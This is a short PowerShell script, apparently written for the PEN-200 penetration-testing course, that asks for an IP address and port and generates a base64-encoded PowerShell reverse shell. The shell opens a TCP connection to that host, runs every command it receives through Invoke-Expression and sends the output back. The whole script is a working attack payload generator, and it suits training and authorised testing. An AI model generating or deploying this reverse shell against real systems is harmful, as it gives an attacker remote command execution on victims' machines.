#!/usr/bin/env pwsh

# Cf. PEN-200, 9.3.1, Listing 32 - Encoding the oneliner in PowerShell on Linux
# https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-upload-vulnerabilities/using-executable-files

# Prompt for IP Address
$ipAddress = Read-Host -Prompt "Enter the IP address"

# Validate the IP Address
if (-not [System.Net.IPAddress]::TryParse($ipAddress, [ref]$null)) {
    Write-Host "Invalid IP address format. Please enter a valid IP address."
    exit
}

# Prompt for Port Number
$portNumber = Read-Host -Prompt "Enter the port number"

# Validate the Port Number
if ($portNumber -notmatch '^\d+$' -or $portNumber -lt 0 -or $portNumber -gt 65535) {
    Write-Host "Invalid port number. Please enter a port number between 0 and 65535."
    exit
}

# Construct the $Text string with variable expansion
$Text = "`$client = New-Object System.Net.Sockets.TCPClient('$ipAddress',$portNumber);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close()"

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText

# Output the constructed string (for verification or debugging)
Write-Host $EncodedText
